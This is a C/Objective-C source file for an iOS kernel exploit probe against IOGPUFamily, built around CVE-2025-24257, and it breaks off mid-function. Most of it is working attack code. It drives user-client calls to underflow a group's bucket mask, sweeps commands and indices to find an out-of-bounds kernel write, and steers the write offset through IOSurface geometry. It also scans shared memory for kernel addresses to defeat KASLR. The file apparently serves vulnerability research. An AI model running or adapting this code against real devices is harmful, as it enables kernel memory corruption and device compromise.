/* IOGPU group-growth OOB write - focused probe for the SECOND, UNCHECKED
 * capacity path in IOGPUFamily 129.3.2 (iOS 26.2 / 23C55).
 *
 * THE TWO CAPACITY SITES
 *   A) creation path, 0x9f60fcc:
 *          0x9f60fe4: cmp  w2, #0x3f
 *          0x9f60fe8: b.hi 0x9f61028      ; capacity > 63 required
 *          0x9f60fec: mov  w8, #0x40      ; else capacity := 64
 *          0x9f61020: mov  x19, #0        ; ... and return NULL
 *      => the iOS 18.4 fix lives HERE. capacity < 64 is refused.
 *
 *   B) growth path, 0x9f74df8 / 0x9f64910:
 *          0x9f64938: ldr  w8, [x0, #0x20]
 *          0x9f64940: mov  x21, w8        ; count
 *          0x9f649ac: bl   0x9f611ec      ; -> init, capacity = 2*count
 *          0x9f755cc: lsr  w9, w22, #6
 *          0x9f755d0: sub  w9, w9, #1     ; obj+40 = (capacity>>6)-1
 *      => NO lower bound on capacity here. count == 1 -> capacity == 2
 *         -> mask == 0xffffffff.
 *
 *   init @ 0x9f61200 then stores the mask as the bucket index mask of the
 *   group, and the bitmap is only (capacity+63)/8 bytes, so a huge mask
 *   turns every later bucket index into an out-of-bounds access.
 *
 *   Path B is reached from the GROW inside the group object, i.e. when a
 *   resource is ADDED to an existing group. The user-facing entry for that
 *   is the same selector 8 with command 130 (s_group_add_resources,
 *   0x9f606d8) - the fix in (A) does not cover it.
 *
 * COMMANDS inside selector 8 (the group dispatcher 0x9f7314c):
 *   struct[0]  = command
 *     0   -> 0x9f60050  s_new_resource      (guarded, capacity > 63)
 *     3   ->              s_new_resource group (what we already use)
 *     130 -> 0x9f606d8  s_group_add_resources
 *   struct[56] = capacity (cmd 3) / resource handle (cmd 130)
 *   struct[60] = dimension
 *   struct[64] = second dimension
 *   struct[72] = third parameter
 *   struct[24] = pointer to an args blob (>= 16 bytes), NULL is accepted
 *
 * WHAT THIS PROBE DOES
 *   1. new_resource   (cmd 0, capacity 64)  -> capture the returned handle
 *   2. new group      (cmd 3, capacity 64)  -> capture the group pointer
 *   3. add resource   (cmd 130, handle)     -> triggers the growth path
 *   4. read back the group object with the B12 read channel and print
 *      obj+0x20 (count) and obj+0x28 (mask). mask == 0xffffffff after
 *      step 3 == the underflow, live, on this build.
 *
 *   Every step is logged durably BEFORE it runs, so a kernel panic still
 *   leaves the exact step in Documents/group_oob.log.
 */
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <dlfcn.h>
#import <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"
#include "nk_trace.h"
#include <stdarg.h>

#define ol(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                            nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__); } while (0)
#define ofile(fmt, ...) nk_doc_log("group_oob.log", fmt, ##__VA_ARGS__)
static uint32_t g_calls;

#define IOGPU_SEL        8u
#define CMD_NEW_RESOURCE 0u
#define CMD_NEW_GROUP   3u
#define CMD_ADD_RES    130u
#define STRUCT_SZ      0x100u

static uint8_t g_args[64];
static uint8_t g_outbuf[0x200];
static uint8_t *g_last_out = g_outbuf;

static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
                  uint64_t f64, uint64_t f72)
{
    memset(in, 0, STRUCT_SZ);
    uint64_t c = cmd;
    memcpy(in + 0, &c, 8);
    memcpy(in + 56, &f56, 8);
    memcpy(in + 60, &f60, 8);
    memcpy(in + 64, &f64, 8);
    memcpy(in + 72, &f72, 8);
    /* struct[80] is the w27 gate of the new_resource path (0x9f600dc:
     * cbz w26 -> fail). It must be non-zero. */
    uint64_t w27 = 1;
    memcpy(in + 80, &w27, 8);
    /* struct[24] is a pointer to a >= 16 byte args blob (0x9f600c8: cmp x3,#16). */
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);
}

static int call_sel2(io_connect_t conn, uint32_t cmd, uint32_t surf_off,
                     uint64_t surf_val, uint64_t cap)
{
    static uint8_t in[STRUCT_SZ];
    memset(in, 0, STRUCT_SZ);
    uint64_t c = cmd;
    memcpy(in + 0, &c, 8);
    if (surf_off + 8 <= STRUCT_SZ) memcpy(in + surf_off, &surf_val, 8);
    memcpy(in + 56, &cap, 8);
    uint64_t w27 = 1;
    memcpy(in + 80, &w27, 8);
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);
    static uint8_t out[0x200];
    size_t on = sizeof(out);
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, STRUCT_SZ, out, &on);
    g_last_out = out;
    return (int)kr;
}

static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
                    uint64_t f64, uint64_t f72, uint8_t *out, size_t *outn)
{
    static uint8_t in[STRUCT_SZ];
    build(in, cmd, f56, f60, f64, f72);
    *outn = *out ? *outn : 0;
    size_t on = 0x200;
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, STRUCT_SZ, out, &on);
    *outn = on;
    return (int)kr;
}


/* ------------------------------------------------------------------ */
/* PoC-exact mode: the published CVE-2025-24257 trigger, swept over EVERY  */
/* selector and both user-client types.                                 */
/*                                                                       */
/* The public PoC (wh1te4ever/xnu_1day_practice, CVE-2025-24257/poc.c):   */
/*   struct[0]    = 3              (IOGPUResource::newResourceGroup)       */
/*   struct[0x38] = capacity       (1 => panic; 1,2,4,8,0x10,0x20 panic) */
/*   output+0x10  = group pointer                                       */
/*   selector 10, user-client type 5                                    */
/*   the panic happens when the group is DESTROYED (process exit), so    */
/*   closing the connection is part of the trigger.                       */
/*                                                                       */
/* On 23C55 the table was reorganised (two 56-entry tables, sel 64 only   */
/* on type 33), so the selector is swept instead of assumed.              */
/* ------------------------------------------------------------------ */
static void poc_exact_sweep(io_connect_t conn, uint32_t type)
{
    static const uint32_t caps[] = { 1, 2, 4, 8, 0x10, 0x20, 0x40 };
    static uint8_t in[0x400];
    static uint8_t out[0x400];

    for (uint32_t sel = 0; sel < 128; sel++) {
        for (uint32_t ci = 0; ci < sizeof(caps)/sizeof(caps[0]); ci++) {
            memset(in, 0, sizeof(in));
            memset(out, 0, sizeof(out));
            uint64_t three = 3;
            memcpy(in + 0x00, &three, 8);
            uint32_t cap = caps[ci];
            memcpy(in + 0x38, &cap, 4);

            ofile("[poc] CALL type=%u sel=%u cap=0x%x", type, sel, cap);
            size_t on = sizeof(out);
            kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, sizeof(in), out, &on);
            g_calls++;
            if (kr == KERN_SUCCESS) {
                uint64_t grp = 0;
                memcpy(&grp, out + 0x10, 8);
                ofile("[poc] *** CREATED type=%u sel=%u cap=0x%x grp=0x%016llx  (closing conn -> destructor -> bitmap walk)",
                      type, sel, cap, (unsigned long long)grp);
                nk_log("[poc] *** CREATED type=%u sel=%u cap=0x%x grp=0x%016llx",
                       type, sel, cap, (unsigned long long)grp);
                /* closing the connection destroys the group: that is where the
                   underflowed bitmap mask is walked. */
                IOServiceClose(conn);
                ofile("[poc] conn closed (group destroyed)");
                return;
            } else if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)0xe00002c7) {
                ofile("[poc] kr=0x%x type=%u sel=%u cap=0x%x", kr, type, sel, cap);
            }
        }
    }
}


/* ------------------------------------------------------------------ */
/* CAPACITY FIELD HUNT: which struct offset is the real capacity?        */
/*                                                                       */
/* Observed on 23C55: with struct[56]=1..63 the call answers            */
/* kIOReturnNoResources, with struct[56]=64/128/4096 it succeeds.       */
/* That looks like a `cmp w2,#0x3f` guard - but on WHICH field? If it   */
/* is not the same field that ends up in (capacity>>6)-1, then setting  */
/* the guarded field to 64 while the real capacity stays 1 gives the     */
/* underflow directly, with no need for the growth path.                 */
/*                                                                       */
/* Method: for every candidate offset, set THAT field to 1 and every     */
/* other candidate to 64. Whichever combination succeeds has found a     */
/* field that is not capacity-guarded. Then set the capacity field to 1  */
/* and see the group being created with a poisoned mask.                 */
/* ------------------------------------------------------------------ */
static void capacity_field_hunt(io_connect_t conn)
{
    static const uint32_t offs[] = { 8, 16, 24, 32, 40, 48, 56, 60, 64, 72, 80 };
    static uint8_t in[0x400];
    static uint8_t out[0x200];

    ol("[hunt] capacity field hunt");
    for (uint32_t oi = 0; oi < sizeof(offs)/sizeof(offs[0]); oi++) {
        uint32_t off = offs[oi];
        for (uint32_t variant = 0; variant < 2; variant++) {
            /* variant 0: only this field = 1, rest of the candidates = 64
               variant 1: this field = 64, the field at 56 = 1 */
            memset(in, 0, sizeof(in));
            memset(out, 0, sizeof(out));
            uint64_t three = 3;
            memcpy(in + 0, &three, 8);
            uint64_t w27 = 1;
            memcpy(in + 80, &w27, 8);
            uintptr_t ap = (uintptr_t)g_args;
            memcpy(in + 24, &ap, 8);
            for (uint32_t oj = 0; oj < sizeof(offs)/sizeof(offs[0]); oj++) {
                if (offs[oj] == 24 || offs[oj] == 80) continue;   /* ptr / gate */
                uint64_t v = 64;
                memcpy(in + offs[oj], &v, 8);
            }
            uint64_t one = 1;
            if (variant == 0) memcpy(in + off, &one, 8);
            else            memcpy(in + 56, &one, 8);

            ofile("[hunt] CALL off=0x%x variant=%u", off, variant);
            size_t on = sizeof(out);
            kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
            g_calls++;
            uint64_t grp = 0;
            if (kr == 0) memcpy(&grp, out + 0x10, 8);
            ol("[hunt] off=0x%x variant=%u -> kr=0x%x grp=0x%016llx",
               off, variant, kr, (unsigned long long)grp);
            if (kr == 0 && variant == 0) {
                ol("[hunt] *** field at +0x%x accepts 1 while others are 64 -> "
                   "it is NOT the capacity-guarded field", off);
            }
        }
    }
}


/* A plain userspace read with a SIGSEGV guard.
 *
 * The group handle that cmd=3 hands back (out+0x10) is a USERSPACE
 * address - the group is delivered as a user mapping. Reading it does not
 * need the dead kernel-read channel at all: a normal memcpy does it. The
 * only risk is that the address is not mapped, so the read is wrapped in
 * a SIGSEGV handler and the bytes are probed in small steps.
 *
 * If the object is mapped we get the group's internals: the element
 * array, the bitmap and the MASK - and the array/bitmap pointers are
 * kernel addresses. That is the KASLR anchor and the readback we need
 * for everything else. */
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>

static sigjmp_buf g_grp_jmp;
static volatile sig_atomic_t g_grp_segv;

static void grp_segv_handler(int sig)
{
    (void)sig;
    g_grp_segv = 1;
    siglongjmp(g_grp_jmp, 1);
}

static int grp_safe_read(uint64_t addr, void *dst, size_t n)
{
    struct sigaction sa, old;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = grp_segv_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NODEFER | SA_RESTART;
    if (sigaction(SIGSEGV, &sa, &old) != 0) return -1;
    g_grp_segv = 0;
    if (sigsetjmp(g_grp_jmp, 1) == 0) {
        memcpy(dst, (const void *)(uintptr_t)addr, n);
        sigaction(SIGSEGV, &old, NULL);
        return g_grp_segv ? -1 : 0;
    }
    sigaction(SIGSEGV, &old, NULL);
    return -1;
}

static int grp_is_kernel_va(uint64_t v)
{
    uint64_t a = v & 0x00ffffffffffffffULL;
    if (a < 0xfffffff000000000ULL || a >= 0xffffffff00000000ULL) return 0;
    if (a == 0xffffffffffffffffULL) return 0;
    return 1;
}

/* Dump the shared buffer behind a group handle and report what changed.
 *
 * The handle cmd=3 returns (out+0x10) is not the group object: it is a
 * pointer INTO a shared buffer, and it advances by 0xC0 on every insert
 * (0x113bd80c0 -> 0x113bd8180 -> 0x113bd8240 in the 21:32 run). The
 * buffer is a fill pattern (ff 00 00 00 repeating) at the start.
 *
 * So the window is dumped wide (0x4000) and compared chunk by chunk
 * against the previous dump: only the chunks that CHANGED are logged.
 * Whatever the group publishes into the shared buffer - the element
 * array, the bitmap, the MASK, the resource slots - shows up as a
 * changed chunk, and a kernel address in there is the anchor. */
#define GRP_WIN 0x4000
#define GRP_CHUNK 0x20

static uint8_t g_grp_prev[GRP_WIN];
static int g_grp_have_prev;

static void grp_dump_handle(uint64_t h, const char *tag)
{
    if (!h) { ol("[grp] %s handle is null", tag); return; }
    uint8_t *buf = (uint8_t *)malloc(GRP_WIN);
    if (!buf) return;
    memset(buf, 0, GRP_WIN);
    int got = 0;
    for (size_t off = 0; off < GRP_WIN; off += GRP_CHUNK) {
        if (grp_safe_read(h + off, buf + off, GRP_CHUNK) == 0) { got = 1; break; }
    }
    if (!got) {
        ol("[grp] %s handle 0x%016llx is NOT mapped", tag, (unsigned long long)h);
        free(buf);
        return;
    }
    /* fill the rest with the pattern we already know about */
    for (size_t off = GRP_CHUNK; off < GRP_WIN; off += GRP_CHUNK) {
        if (grp_safe_read(h + off, buf + off, GRP_CHUNK) != 0) {
            memset(buf + off, 0xff, GRP_CHUNK);
        }
    }
    ol("[grp] %s handle=0x%016llx mapped, window=0x%x", tag, (unsigned long long)h, GRP_WIN);
    int changed = 0;
    for (size_t off = 0; off < GRP_WIN; off += GRP_CHUNK) {
        if (g_grp_have_prev && !memcmp(g_grp_prev + off, buf + off, GRP_CHUNK)) continue;
        changed++;
        ol("[grp] %s CHUNK +0x%04zx:", tag, off);
        for (size_t o = 0; o < GRP_CHUNK; o += 8) {
            uint64_t v = 0;
            memcpy(&v, buf + off + o, 8);
            if (!v) continue;
            ol("[grp] %s   +0x%04zx = 0x%016llx%s", tag, off + o, (unsigned long long)v,
               grp_is_kernel_va(v) ? "   <-- KERNEL ADDRESS" : "");
        }
    }
    ol("[grp] %s changed chunks: %d", tag, changed);
    memcpy(g_grp_prev, buf, GRP_WIN);
    g_grp_have_prev = 1;
    free(buf);
}

void nk_iogpu_group_oob_run(int trigger)
{
    nk_doc_log_open("group_oob.log");
    ol("[grp] === IOGPU group-growth OOB probe (23C55) mode=%s ===",
       trigger ? "TRIGGER" : "READ-ONLY");
    ol("[grp] durable log: Documents/group_oob.log");
    if (!trigger) ol("[grp] READ-ONLY: steps 1+2 only, no add-resource, no crash");

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { ol("[grp] no IOGPU service"); return; }

    io_connect_t conn = MACH_PORT_NULL;
    uint32_t use_type = 0; (void)use_type;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
            conn = c; use_type = t;
            ol("[grp] OPEN IOGPU type=%u", t);
        }
    }
    if (!conn) { ol("[grp] no usable type"); return; }

    static uint8_t out[0x200];
    size_t on = 0;

    /* The readback needs the B12/NECP kernel-read channel. On 23.55 that
     * vector is dead ("data-only NECP vector dead on 23.55"), and calling
     * nk_dataonly_necp_chain() from here killed the app: the probe runs in
     * two instances (TRIGGER + READ-ONLY) and both drove the chain, racing
     * on its globals. The chain is NOT needed for the grow trigger, so it is
     * not called from the probe at all. */
    {
        uint8_t probe[8];
        int rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
        ol("[grp] kernel read channel: %s (kr=%d) - mask readback unavailable",
           rr == 0 ? "up" : "down", rr);
    }

    int kr = 0;

    /* A surface and its global id: the kernel registers IOSurfaces as
       resources, and the cmd-130 lookup compares element->0x10 with the key,
       so the surface's global id is a prime key candidate. */
    uint32_t surf_id = 0;
    uint32_t surf_ids[8];
    uint32_t nsurf = 0;
    IOSurfaceRef surf = NULL;
    for (uint32_t si = 0; si < 8; si++) {
        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000 + si * 16});
        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
        const void *values[] = { w, h, bpe, pf };
        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
                                                  &kCFTypeDictionaryKeyCallBacks,
                                                  &kCFTypeDictionaryValueCallBacks);
        IOSurfaceRef s2 = IOSurfaceCreate(props);
        CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
        uint32_t id2 = (getid && s2) ? getid(s2) : 0;
        if (id2) surf_ids[nsurf++] = id2;
        if (si == 0) { surf = s2; surf_id = id2; }
    }
    {
        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000});
        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
        const void *values[] = { w, h, bpe, pf };
        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
                                                  &kCFTypeDictionaryKeyCallBacks,
                                                  &kCFTypeDictionaryValueCallBacks);
        surf = IOSurfaceCreate(props);
        CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
        ol("[grp] IOSurface=%p global id=%u (%u surfaces)", (void *)surf, surf_id, nsurf);
    }

    if (trigger) {
        /* First: find out which field the capacity guard really checks. */
        capacity_field_hunt(conn);
        ol("[grp] capacity field hunt done (calls=%u)", g_calls);
    }

    if (trigger == 2) {
        /* THE cmd=64 PATH: capacity 1.
         *
         * The handler 0x9f612f0 takes the capacity from struct[56] and the
         * dimension size from struct[80], then rounds the capacity UP to a
         * multiple of the dimension: (cap + dim - 1) & -dim (0x9f4d328).
         * With dim == 1 the rounding is a no-op, so the capacity stays 1.
         * capacity == 1 means log2(capacity) == 0, which makes the bucket
         * shift in the insert path degenerate (0x9f62c04 lsr x9, x20, x9:
         * a shift by 64 becomes a shift by 0) - the bucket becomes the full
         * 64-bit hash and the bitmap access leaves the allocation. That is
         * the CVE-2025-24257 write, and it is a 4-byte RMW at a
         * hash-derived offset.
         *
         * cmd=64 has to be the FIRST command on the session: the handler
         * refuses when bit 1 of the session state byte is set
         * (0x9f61350 ldrb w8,[x20,#64] / tbnz w8,#1), and creating a group
         * with cmd=3 sets it. The earlier matrix created a group first and
         * therefore never reached this path.
         */
        ol("[grp] === cmd=64 UNDERFLOW TRIGGER (capacity=1, dim=1) ===");
        ol("[grp] session must be clean: this is the first command on the connection");

        static uint8_t o64[0x200];
        size_t on64 = 0;
        int k64 = call_sel(conn, 64, 1, 0, 0, 0, o64, &on64);
        uint64_t grp64 = 0;
        if (k64 == 0) memcpy(&grp64, o64 + 0x10, 8);
        ol("[grp] cmd=64 cap=1 dim=1 -> kr=0x%x grp=0x%016llx outN=%zu", k64,
           (unsigned long long)grp64, on64);
        for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
            uint64_t v = 0;
            memcpy(&v, o64 + w, 8);
            ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
        }
        if (k64 != 0) {
            ol("[grp] cmd=64 refused (kr=0x%x) - capacity 1 not accepted on this build", k64);
            ol("[grp] no underflow trigger; the group was not created");
        } else {
            ol("[grp] *** group with capacity 1 created - the mask is (1>>6)-1 = 0xffffffff");
            ol("[grp] adding the surface: the insert will compute bucket = hash >> 0");
            for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
                ol("[grp] OOB add surf_id=%u", surf_ids[extra]);
                int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, o64, &on64);
                ol("[grp] OOB add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
                if (ke == (int)0x10000003) {
                    ol("[grp] client died (INVALID_DEST) - the out-of-bounds "
                       "bitmap access already hit unmapped memory");
                    break;
                }
            }
            ol("[grp] closing the connection (the group destructor walks the "
               "bitmap with the underflowed mask)");
        }
        ol("[grp] cmd=64 trigger done");
    }


    if (trigger == 3) {
        /* THE REMOVE PATH.
         *
         * The mask lives at +0x30 of the slot table and is DECREMENTED on
         * every removal:
         *   0x9f51914: ldr  w9, [x0, #48]     ; +0x30 = MASK
         *   0x9f51918: sub  w9, w9, #1
         *   0x9f5191c: str  w9, [x0, #48]
         * A group created with capacity 64 has MASK = (64>>6)-1 = 0, so the
         * first removal turns it into 0xffffffff. After that the bitmap word
         * index is no longer masked and the insert path
         * (0x9f62c04 lsr x9,x20,x9 / 0x9f62c28 ldr w10,[x12]) walks out of
         * the allocation. That is the live CVE-2025-24257 on 23.55.
         *
         * So: create the group, add a resource, find the command that
         * REMOVES it, then add again - the second add is the one that
         * goes out of bounds.
         */
        ol("[grp] === REMOVE-PATH TRIGGER ===");
        static uint8_t o3[0x200];
        size_t on3 = 0;

        int k3 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o3, &on3);
        uint64_t grp3 = 0;
        if (k3 == 0) memcpy(&grp3, o3 + 0x10, 8);
        ol("[grp] group -> kr=0x%x grp=0x%016llx", k3, (unsigned long long)grp3);
        if (k3 != 0) { ol("[grp] no group"); return; }

        int ka = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o3, &on3);
        ol("[grp] add surf_id=%u -> kr=0x%x", surf_id, ka);

        /* Which command removes it? Try every command with the surface id
         * in struct[56] and with the group handle, and note the ones that
         * answer. */
        ol("[grp] probing the remove command");
        uint32_t rem_cmd = 0xffffffffu;
        for (uint32_t cmd = 0; cmd < 256; cmd++) {
            if (cmd == CMD_NEW_GROUP || cmd == CMD_ADD_RES) continue;
            uint64_t key = surf_id;
            int kk = call_sel(conn, cmd, key, 1, 0, 0, o3, &on3);
            if (kk == 0) {
                ol("[grp] cmd=%u with the surface id -> kr=0 (candidate remove)", cmd);
                if (rem_cmd == 0xffffffffu) rem_cmd = cmd;
            }
        }
        ol("[grp] remove candidate cmd=%u", rem_cmd);

        if (rem_cmd != 0xffffffffu) {
            ol("[grp] *** removing the resource with cmd=%u - the mask goes 0 -> 0xffffffff", rem_cmd);
            int kr2 = call_sel(conn, rem_cmd, surf_id, 1, 0, 0, o3, &on3);
            ol("[grp] remove -> kr=0x%x", kr2);
            ol("[grp] adding again: this insert must use the underflowed mask");
            for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
                ol("[grp] OOB add surf_id=%u", surf_ids[extra]);
                int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, o3, &on3);
                ol("[grp] OOB add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
                if (ke == (int)0x10000003) {
                    ol("[grp] client died (INVALID_DEST) - the out-of-bounds "
                       "bitmap access already hit unmapped memory");
                    break;
                }
            }
        } else {
            ol("[grp] no remove command found by probing; trying the group handle as the key");
            for (uint32_t cmd = 0; cmd < 256; cmd++) {
                if (cmd == CMD_NEW_GROUP || cmd == CMD_ADD_RES) continue;
                int kk = call_sel(conn, cmd, grp3, 1, 0, 0, o3, &on3);
                if (kk == 0) {
                    ol("[grp] cmd=%u with the group handle -> kr=0 (candidate remove)", cmd);
                    int kr2 = call_sel(conn, cmd, grp3, 1, 0, 0, o3, &on3);
                    ol("[grp]   repeat -> kr=0x%x", kr2);
                    int ke = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o3, &on3);
                    ol("[grp]   add after that -> kr=0x%x", ke);
                    break;
                }
            }
        }
        ol("[grp] remove-path trigger done");
    }



    if (trigger == 0 || trigger == 5) {
        /* INDEX SWEEP.
         *
         * The slot table's remove (0x9f518ac) reads its element array at
         * +0x10 with an 8-byte stride (ubfiz x9, x1, #3), but that array is
         * allocated as kalloc(capacity*4) - four bytes per slot. The only
         * bound check is "index < capacity" (0x9f518b4), so any index in
         * [capacity/2, capacity) writes eight bytes past the end of the
         * allocation, and the write is a real one:
         *   0x9f518ec: ldr x8, [x10]
         *   0x9f518f0: str xzr, [x10]
         * The index is the slot number, so sweeping it walks the write
         * across the memory after the array. A kill here is the OOB hitting
         * an unmapped page.
         */
        ol("[grp] === INDEX SWEEP (mode=%d) ===", trigger);
        static uint8_t o5[0x200];
        size_t on5 = 0;
        int k5 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o5, &on5);
        uint64_t grp5 = 0;
        if (k5 == 0) memcpy(&grp5, o5 + 0x10, 8);
        ol("[grp] group -> kr=0x%x grp=0x%016llx", k5, (unsigned long long)grp5);
        if (k5 != 0) return;
        int ka5 = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o5, &on5);
        ol("[grp] add surf_id=%u -> kr=0x%x", surf_id, ka5);

        static const uint64_t idxs[] = {
            0,1,2,4,8,16,24,30,31,32,33,40,48,56,60,62,63,64,65,96,128,255,256
        };
        for (size_t ii = 0; ii < sizeof(idxs)/sizeof(idxs[0]); ii++) {
            for (uint32_t cmd = 0; cmd < 256; cmd++) {
                if (cmd == CMD_NEW_GROUP) continue;
                uint64_t key = idxs[ii];
                int kk = call_sel(conn, cmd, key, 1, 0, 0, o5, &on5);
                if (kk == (int)0x10000003) {
                    ol("[grp] *** client died at cmd=%u index=0x%llx - the OOB "
                       "write hit an unmapped page", cmd, (unsigned long long)idxs[ii]);
                    ol("[grp] index sweep done (dead)");
                    return;
                }
                if (kk == 0) {
                    ol("[grp] idx=0x%llx cmd=%u -> kr=0", (unsigned long long)idxs[ii], cmd);
                }
            }
        }
        ol("[grp] index sweep done (no crash)");
    }


    if (trigger == 6) {
        /* CONTROLLED OOB WRITE via the duplicate insert.
         *
         * The hash table's remove (0x9f518ac) takes its element from the
         * array at +0x10 with an 8-byte stride (ubfiz x9, x1, #3) while
         * that array is allocated as kalloc(capacity*4) - four bytes per
         * slot. The only guard is "index < capacity" (0x9f518b4). With
         * capacity 64 the array is 256 bytes, so any index >= 32 writes
         * eight bytes past the end:
         *   0x9f518ec: ldr x8, [x10]
         *   0x9f518f0: str xzr, [x10]
         * The index is (bit + bucket) & (capacity-1) and the bucket comes
         * from hash = [resource+0x70] * 0x9e3779b97f4a7c15, i.e. from a
         * field of the IOSurface we added. Changing the surface properties
         * changes the hash, so the index - and with it the write offset -
         * is steerable.
         *
         * The duplicate insert is what triggers the remove: the insert
         * finds the old entry and drops it. So: for many different surface
         * geometries, add twice and watch. A kill is the OOB write landing
         * on something that matters.
         */
        ol("[grp] === CONTROLLED OOB WRITE (dup-add + index steering) ===");
        static uint8_t o6[0x200];
        size_t on6 = 0;

        struct { uint32_t w, h, bpe, fmt; } geos[] = {
            { 16, 16, 4, 0 }, { 32, 32, 4, 0 }, { 64, 64, 4, 0 },
            { 128, 128, 4, 0 }, { 256, 256, 4, 0 }, { 512, 512, 4, 0 },
            { 1024, 1024, 4, 0 }, { 17, 13, 4, 0 }, { 33, 31, 4, 0 },
            { 65, 63, 4, 0 }, { 129, 127, 4, 0 }, { 255, 255, 4, 0 },
            { 1023, 1023, 4, 0 }, { 4095, 4095, 4, 0 }, { 7, 5, 4, 0 },
            { 8, 8, 1, 0 }, { 8, 8, 2, 0 }, { 8, 8, 8, 0 },
            { 12, 12, 16, 0 }, { 2048, 2048, 4, 0 }
        };
        uint32_t ngeo = sizeof(geos) / sizeof(geos[0]);

        for (uint32_t gi = 0; gi < ngeo; gi++) {
            const void *keys[] = { kIOSurfaceWidth, kIOSurfaceHeight,
                                   kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
            CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].w);
            CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].h);
            CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].bpe);
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].fmt);
            const void *vals[] = { nw, nh, nb, nf };
            CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                                      &kCFTypeDictionaryKeyCallBacks,
                                                      &kCFTypeDictionaryValueCallBacks);
            IOSurfaceRef s = props ? IOSurfaceCreate(props) : NULL;
            if (props) CFRelease(props);
            CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nf);
            if (!s) { ol("[grp] geo[%u] %ux%u bpe=%u - surface failed", gi, geos[gi].w, geos[gi].h, geos[gi].bpe); continue; }
            uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
            uint32_t id = getid ? getid(s) : 0;
            ol("[grp] geo[%u] %ux%u bpe=%u -> global id=%u", gi, geos[gi].w, geos[gi].h, geos[gi].bpe, id);

            int k6 = call_sel(conn, CMD_NEW_GROUP, 64, id, 0, 0, o6, &on6);
            if (k6 != 0) { ol("[grp] geo[%u] group failed kr=0x%x", gi, k6); CFRelease(s); continue; }
            {
                uint64_t gh = 0;
                memcpy(&gh, o6 + 0x10, 8);
                grp_dump_handle(gh, "geo");
            }
            int a1 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
            {
                uint64_t gh2 = 0;
